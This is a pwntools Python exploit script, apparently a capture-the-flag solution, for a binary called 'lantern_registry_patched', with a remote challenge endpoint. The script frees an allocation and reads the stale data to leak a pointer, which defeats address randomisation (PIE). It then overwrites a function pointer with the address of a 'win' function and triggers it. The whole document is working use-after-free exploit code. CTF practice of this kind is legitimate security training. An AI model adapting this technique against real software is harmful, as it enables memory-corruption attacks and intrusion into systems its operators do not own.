#!/usr/bin/env python3

from pwn import *

exe = ELF("./lantern_registry_patched")

context.binary = exe
context.log_level="debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13536)

    return r


def main():
    r = conn()
    r.recv()
    
    #CREATE MALLOC
    r.sendline('1')
    r.recvuntil('Name the lantern: ')
    r.sendline(b'name')
    r.recvuntil('> ')
    
    #FREE MALLOC
    r.sendline('2')
    r.recvuntil('> ')


    

    #INSPECT
    r.sendline("3")
    leak_draft=r.recvline()
    print(leak_draft[8:40],len(leak_draft))
    leak_draft=leak_draft[8:40]



    for i in range (0,len(leak_draft),8):
        chunk = leak_draft[i:i+8]
        print("CHUNK:", hex(u64(chunk,"little")))

    default_flash_leak=u64(chunk,"little")
    PIE_BASE=default_flash_leak-exe.sym["default_flash"]
    WIN= exe.sym["win"]+PIE_BASE
    print("WIN",hex(WIN))

    
    #REFORGE
    r.sendline('4')
    r.recvuntil('bytes: ')
    payload= flat(
        b'A'*24,
        p64(WIN)

    )
    r.send(payload)
    r.recvuntil('> ')
    r.sendline('5')
    print(r.recvline())
    

    #r.interactive()


if __name__ == "__main__":
    main()
